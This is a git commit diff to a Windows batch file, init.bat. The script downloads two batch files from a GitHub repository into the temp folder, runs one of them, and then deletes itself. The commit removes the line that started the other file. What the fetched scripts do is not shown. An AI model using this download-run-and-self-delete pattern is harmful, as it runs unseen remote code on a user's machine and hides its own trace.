33bf4d2067501e6c9f88b7c506a1c0057866264b
Z-tech2 <107017335+Z-tech2@users.noreply.github.com>
2023-09-30 23:54:19 -0400

    Update init.bat

--- init.bat
+++ init.bat
@@ -1,6 +1,5 @@
 cd %temp%
 curl -O https://raw.githubusercontent.com/Z-tech2/cmdBP/main/comm.bat
 curl -O https://raw.githubusercontent.com/Z-tech2/cmdBP/main/del.bat
-start %temp%\comm.bat
 start %temp%\del.bat
 del %0
